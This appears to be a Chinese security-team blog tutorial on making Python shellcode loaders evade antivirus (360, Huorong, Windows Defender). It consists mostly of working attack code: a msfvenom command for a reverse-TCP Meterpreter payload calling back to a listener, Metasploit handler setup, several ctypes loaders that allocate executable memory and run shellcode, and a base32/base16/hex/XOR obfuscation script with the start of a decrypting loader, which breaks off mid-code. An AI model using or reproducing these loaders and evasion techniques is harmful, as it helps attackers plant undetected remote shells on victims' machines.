<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>jammny - Fighter安全团队</title>
    <link rel="stylesheet" type="text/css" href="./theme/css/screen.min.css">
    <link rel="stylesheet" type="text/css" href="./theme/css/highlight.min.css">
    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
    <link rel="publisher" href="">
    <link rel="apple-touch-startup-image" href="./theme/images/logo.png">
    <link type="text/plain" rel="socialmedia" href="./socialmedia.txt">
    <link rel="dns-prefetch" href="."/>
    <link rel="dns-prefetch" href="//www.gstatic.com"/>
    <link rel="dns-prefetch" href="//fonts.gstatic.com"/>
    <link rel="dns-prefetch" href="//fonts.googleapis.com"/>
    <link rel="dns-prefetch" href="//accounts.google.com"/>
    <link rel="dns-prefetch" href="//ssl.google-analytics.com"/>
    <link rel="dns-prefetch" href="//www.google-analytics.com"/>
    <link rel="dns-prefetch" href="//googleads.g.doubleclick.net"/>
    <link rel="dns-prefetch" href="//pagead2.googlesyndication.com"/>
    <link rel="dns-prefetch" href="//twemoji.maxcdn.com"/>
    <meta http-equiv="content-type" content="text/html;charset=utf-8">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
    <meta name="apple-mobile-web-app-capable" content="yes"/>
    <meta name="application-name" content="jammny - Fighter安全团队"/>
    <meta name="msapplication-starturl" content="http:."/>
    <meta name="msapplication-tooltip" content=""/>
    <meta name="msapplication-window" content="width=1024;height=768"/>
    <meta name="msapplication-task" content="name=jammny - Fighter安全团队;action-uri=http:.;icon-uri=./theme/images/favicon.ico"/>
    <meta name="msapplication-TileImage" content="./theme/images/apple-touch-icon-144x144.png"/>
    <meta name="msapplication-TileColor" content="#1F1F21"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="imagetoolbar" content="no">
    <meta http-equiv="pragma" content="cache">
    <meta http-equiv="cache-control" content="cache">
    <meta http-equiv="vary" content="content-language">
    <meta http-equiv="Cache-control" content="max-age=2592000, public">
    <meta http-equiv="content-style-type" content="text/css">
    <meta name="application-name" content="jammny - Fighter安全团队">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content="">
    <meta name="alexaVerifyID" content=""/>
    <meta name="wot-verification" content=""/>
    <meta name="msvalidate.01" content="" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="medium" content="mult">
    <meta name="adblock" content="disable">
    <meta name="rating" content="General">
    <meta name="resource-type" content="document">
    <meta name="revisit-after" content="1 days">
    <meta name="revisit" content="1">
    <meta name="robots" content="index,follow">
    <meta name="no-email-collection" content="http://www.unspam.com/noemailcollection/">
    <link rel="apple-touch-icon" sizes="152x152" href="./theme/images/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="144x144" href="./theme/images/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="114x114" href="./theme/images/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="./theme/images/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="./theme/images/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="72x72" href="./theme/images/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="60x60" href="./theme/images/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="57x57" href="./theme/images/apple-touch-icon-57x57.png">
    <link rel="icon" type="image/png" href="./theme/images/favicon-196x196.png" sizes="196x196">
    <link rel="icon" type="image/png" href="./theme/images/favicon-160x160.png" sizes="160x160">
    <link rel="icon" type="image/png" href="./theme/images/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="./theme/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="./theme/images/favicon-16x16.png" sizes="16x16">
    <link rel="shortcut icon" href="./theme/images/favicon.ico">
    <script type="text/javascript">(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', '', 'auto');ga('send', 'pageview');var _qevents = _qevents || [];</script>
    <script src="//twemoji.maxcdn.com/twemoji.min.js"></script>
</head>
<body class="home-template nav-closed" itemscope itemtype="http://schema.org/WebPage">
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-ML9KT2"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-ML9KT2');</script>
<!-- End Google Tag Manager -->
    <meta itemprop="name" content="jammny - Fighter安全团队">
    <meta itemprop="url" content=".">
    <meta itemprop="headline" content="jammny - Fighter安全团队 || ">
    <meta itemprop="description about" content="">
    <meta itemprop="keywords" content="gnu, linux, software libre, código abierto, tecnología">
    <meta itemprop="primaryImageOfPage" content="./theme/images/logo.png">
    <meta itemprop="inLanguage" content="es">
<nav class="nav">
    <h3 class="nav-title">Menu</h3>
    <a href="#" class="nav-close">
        <span class="hidden">Close</span>
    </a>
    <ul role="menubar">
            <li class="nav-current" role="presentation"><a  href="./archives.html" title="jammny - Fighter安全团队 | Archives" itemprop="name" itemprop="significantLink">Archives</a></li>        
    </ul>
    <a class="subscribe-button icon-feed" href='feeds/all.atom.xml'  target='blank'>RSS</a>
</nav>
<span class="nav-cover"></span>    <div class="site-wrapper">
        <header class="main-header post-head" style="background-image: url(./theme/images/bear.jpg)" itemscope itemtype="http://schema.org/WPHeader">
            <nav class="main-nav overlay clearfix">
                <a class="menu-button" href="#">
                    <span class="burger">&#9776;</span>
                    <span class="word">Menu</span>
                </a>
            </nav>
            <div class="vertical">
                <div class="main-header-content inner">
                    <h1 class="page-title" itemprop="headline">jammny - Fighter安全团队</h1>
                    <h2 class="page-description" itemprop="description"></h2>
                </div>
            </div>
            <a class="scroll-down icon-arrow-left blink_me" href="#content" data-offset="-45">
                <span class="hidden">Scroll Down</span>
            </a>
        </header>
<main id="content" class="content" role="main">
    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
        <header class="post-header">
            <h1 class="post-title" itemprop="headline">Python免杀入门学习</h1>
            <section class="post-meta">
                <span class="entry-author" itemscope="" itemtype="http://schema.org/Person" itemprop="author">
                    <span itemprop="name">jammny - Fighter安全团队</span></span>
                <time class="post-date" itemprop="datePublished" datetime="2023YYY-59M-%DD">星期五, 四月 14, 2023</time>
<nav role="navigation">
    <a class="newer-posts blink_me" href=".">&larr; Back</a>
</nav><br/>            </section>
        </header>
        <section class="post-content">
            <p><code>原创声明：转载本文请标注出处和作者，望尊重作者劳动成果！感谢！</code></p>
<blockquote>
<p>前言：这里主要针对国内主流三大杀软进行免杀测试，python语法简单，开发效率高，适合入门学习，而且免杀效果也还不错。当然免杀是具有时效性的，文章的方法主要记录一下免杀思路。</p>
</blockquote>
<div class="highlight"><pre><span></span><code>python环境：python2.7.18(x64)、python3.11.1(x64)
windows环境：windows10、windows11
杀毒软件：360杀毒（全引擎） + 火绒 + Windows Defender
</code></pre></div>

<p><a name="ifJ6u"></a></p>
<h1>如何加载 shellcode</h1>
<blockquote>
<p>我们可以选择常用的两款工具（MSF、CS）来生成shellcode，下面的测试案例是使用了MSF的shellcode。</p>
</blockquote>
<p><a name="ofj7J"></a></p>
<h2>MSF shellcode</h2>
<p>1、MSF生成 shellcode</p>
<div class="highlight"><pre><span></span><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.128 lport=8080 -f py -b=&quot;\x00&quot;
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459181715_0.png"><br />2、设置监听</p>
<div class="highlight"><pre><span></span><code><span class="n">msfconsole</span>
<span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="o">/</span>
<span class="n">set</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
<span class="n">set</span><span class="w"> </span><span class="n">lhost</span><span class="w"> </span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span>
<span class="n">set</span><span class="w"> </span><span class="n">lport</span><span class="w"> </span><span class="mi">8080</span>
<span class="n">run</span>
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459182461_1.png">
<a name="vSzBM"></a></p>
<h2>Loader 常用模板</h2>
<blockquote>
<p>所有内存加载器原理都是一个流程：申请可执行内存 -&gt; shellcode写入内存 -&gt; 执行该内存。python调用C需要用到内置库：<code>ctypes</code></p>
</blockquote>
<div class="highlight"><pre><span></span><code>https://blog.csdn.net/bianchengxueseng/article/details/115262954
https://cloud.tencent.com/developer/section/1370537
https://zhuanlan.zhihu.com/p/145165873
</code></pre></div>

<p>1、python2 / python3，正常线程执行：VirtualAlloc + RtlMoveMemory + CreateThread</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b</span><span class="s2">&quot;</span>

<span class="n">shellcode</span><span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="c1">#设置VirtualAlloc返回类型为ctypes.c_uint64</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span><span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span>
<span class="c1">#申请内存</span>
<span class="n">ptr</span><span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span>
<span class="c1">#放入shellcode</span>
<span class="n">buf</span><span class="o">=</span> <span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_char</span> <span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">.</span><span class="n">from_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
<span class="c1">#创建一个线程从shellcode放置位置首地址开始执行</span>
<span class="n">handle</span><span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">pointer</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>
<span class="c1">#等待上面创建的线程运行完</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="n">handle</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b</span><span class="s2">&quot;</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span> 
<span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p>2、python2 / python3，函数指针执行：VirtualAlloc + RtlMoveMemory + cast</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b</span><span class="s2">&quot;</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span> 
<span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
<span class="n">runcode</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">cast</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">CFUNCTYPE</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_void_p</span><span class="p">))</span>
<span class="n">runcode</span><span class="p">()</span>
</code></pre></div>

<p>3、python2 ，内存复制 + 渐进式加载：VirtualAlloc + ReallocADsMem + VirtualProtect</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b</span><span class="s2">&quot;</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span> 
<span class="c1"># 第一次申请的内存，存入shellcode</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Activeds</span><span class="o">.</span><span class="n">AllocADsMem</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
<span class="c1"># 第二次申请内存，复制第一次申请内存的内容。</span>
<span class="n">ptr2</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Activeds</span><span class="o">.</span><span class="n">ReallocADsMem</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
<span class="c1"># 渐进式加载模式</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">ptr2</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">byref</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_long</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span>
<span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ptr2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p><a name="bPEUU"></a></p>
<h1>静态免杀</h1>
<p><a name="BwCv5"></a></p>
<h2>shellcode 编码加密混淆</h2>
<blockquote>
<p>思路：用base32 + base16 +  hex 进行编码，最后做一次异或加密。</p>
</blockquote>
<p>1、python2 / python3 混淆代码：</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">version_info</span>


<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;shellcode混淆加密&quot;&quot;&quot;</span>
    <span class="n">shellcode1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b32encode</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="c1"># base16 编码</span>
    <span class="n">shellcode2</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b16encode</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">)</span>
    <span class="c1"># hex编码</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">shellcode3</span> <span class="o">=</span> <span class="n">shellcode2</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span> <span class="c1"># python3</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">shellcode3</span> <span class="o">=</span> <span class="n">shellcode2</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span> <span class="c1"># python2</span>
    <span class="c1"># 设置随机数</span>
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="c1"># 异或加密</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">shellcode3</span><span class="p">:</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span>
    <span class="k">return</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">random_key</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;随机生成6位key&quot;&quot;&quot;</span>
    <span class="n">numOfNum</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">length</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">numOfLetter</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="n">numOfNum</span>
    <span class="n">slcNum</span> <span class="o">=</span> <span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">numOfNum</span><span class="p">)]</span>
    <span class="n">slcLetter</span> <span class="o">=</span> <span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">numOfLetter</span><span class="p">)]</span>
    <span class="n">slcChar</span> <span class="o">=</span> <span class="n">slcNum</span> <span class="o">+</span> <span class="n">slcLetter</span>
    <span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">slcChar</span><span class="p">)</span>
    <span class="n">getPwd</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">slcChar</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">getPwd</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="c1"># shellcode内容</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
    <span class="c1"># 随机数key</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">random_key</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
    <span class="c1"># 编码加密混淆</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;key: &quot;</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;shellcode: &quot;</span> <span class="o">+</span> <span class="n">data</span><span class="p">)</span>
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459182702_2.png"><br />2、python2 / python3 加载代码:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">version_info</span>


<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="c1"># 异或解密</span>
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">xor_code</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">res_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xor_code</span><span class="p">:</span>
        <span class="n">res_code</span> <span class="o">=</span> <span class="n">res_code</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span>
    <span class="c1"># 三重解码</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">res_code</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">res_code</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
